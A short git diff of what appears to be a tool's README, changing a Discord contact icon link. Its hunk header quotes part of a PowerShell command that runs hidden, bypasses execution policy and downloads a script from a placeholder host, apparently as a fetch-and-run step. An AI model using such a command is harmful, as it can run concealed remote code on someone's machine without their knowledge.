@@ -110,4 +110,4 @@ powershell -W Hidden -Exec Bypass -c "$r = iwr https://your-script-host.com/ -H 
 
 ## Contact
 
-<a href="https://discord.com/users/789782857852911616"><img src="https://static.vecteezy.com/system/resources/previews/018/930/602/non_2x/discord-logo-discord-icon-transparent-free-png.png" style="width: 40px, height: 40px"></a>
+<a href="https://discord.com/users/789782857852911616"><img src="https://skillicons.dev/icons?i=discord"></a>
